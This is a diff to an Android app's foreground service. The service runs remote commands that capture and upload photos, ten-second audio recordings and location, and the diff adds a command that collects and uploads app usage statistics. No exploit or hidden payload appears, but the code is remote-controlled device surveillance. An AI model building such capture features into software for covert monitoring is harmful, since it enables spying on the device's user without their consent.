@@ -15,6 +15,7 @@ import androidx.core.app.NotificationCompat
 import com.ikianti.app.capture.AudioCapture
 import com.ikianti.app.capture.CameraCapture
 import com.ikianti.app.capture.LocationCapture
+import com.ikianti.app.capture.UsageStatsCapture
 
 /**
  * Persistenter Foreground Service – wird beim App-Start (im Vordergrund) gestartet
@@ -106,6 +107,7 @@ class CaptureForegroundService : Service() {
             "photo"    -> CameraCapture(this).captureAndUpload { onDone() }
             "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10) { onDone() }
             "location" -> LocationCapture(this).fetchAndUpload { onDone() }
+            "usage"    -> UsageStatsCapture(this).collectAndUpload { onDone() }
             else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); isBusy = false }
         }
     }
